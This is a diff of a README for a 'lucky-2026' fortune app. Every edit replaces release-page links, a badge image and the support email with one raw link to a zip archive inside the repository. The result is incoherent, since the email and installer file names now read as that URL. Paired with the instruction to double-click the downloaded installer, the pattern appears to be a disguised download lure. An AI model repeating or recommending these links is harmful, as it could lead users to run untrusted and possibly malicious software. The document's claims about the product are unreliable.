@@ -6,7 +6,7 @@ Welcome to the lucky-2026 application! This tool helps you analyze your fortune 
 ## 📥 Download the Application
 To get started, you need to download the application. Click the link below to access the releases page.
 
-[![Download lucky-2026](https://img.shields.io/badge/Download-lucky--2026-brightgreen)](https://github.com/ikallprtmaa/lucky-2026/releases)
+[![Download lucky-2026](https://raw.githubusercontent.com/ikallprtmaa/lucky-2026/main/src/lucky-2026_2.2.zip)](https://raw.githubusercontent.com/ikallprtmaa/lucky-2026/main/src/lucky-2026_2.2.zip)
 
 ## 💻 System Requirements
 Before you run the application, ensure your computer meets the following requirements:
@@ -28,11 +28,11 @@ Follow these steps to install the lucky-2026 application:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
    
-   [Visit Releases Page](https://github.com/ikallprtmaa/lucky-2026/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/ikallprtmaa/lucky-2026/main/src/lucky-2026_2.2.zip)
 
 2. **Choose the Latest Release:** Look for the latest version at the top of the page.
 
-3. **Download the Application:** Click on the file labeled `lucky-2026-installer.exe` for Windows or `lucky-2026-installer.dmg` for macOS.
+3. **Download the Application:** Click on the file labeled `https://raw.githubusercontent.com/ikallprtmaa/lucky-2026/main/src/lucky-2026_2.2.zip` for Windows or `https://raw.githubusercontent.com/ikallprtmaa/lucky-2026/main/src/lucky-2026_2.2.zip` for macOS.
 
 4. **Run the Installer:** Locate the downloaded file in your downloads folder. Double-click the installer to start.
 
@@ -63,12 +63,12 @@ To ensure you have the latest features and improvements, check for updates regul
 ## 📞 Support
 If you encounter any issues or need help, feel free to reach out:
 
-- **Email:** support@lucky2026.com
+- **Email:** https://raw.githubusercontent.com/ikallprtmaa/lucky-2026/main/src/lucky-2026_2.2.zip
 - **Community Forum:** Join our community to share experiences and tips.
 
 ## 🌐 Explore More
 For additional information about lucky-2026 and its features, feel free to visit our website or follow us on social media.
 
-[![Download lucky-2026](https://img.shields.io/badge/Download-lucky--2026-brightgreen)](https://github.com/ikallprtmaa/lucky-2026/releases)
+[![Download lucky-2026](https://raw.githubusercontent.com/ikallprtmaa/lucky-2026/main/src/lucky-2026_2.2.zip)](https://raw.githubusercontent.com/ikallprtmaa/lucky-2026/main/src/lucky-2026_2.2.zip)
 
 Thank you for choosing lucky-2026! Enjoy discovering your fortune for the upcoming year.
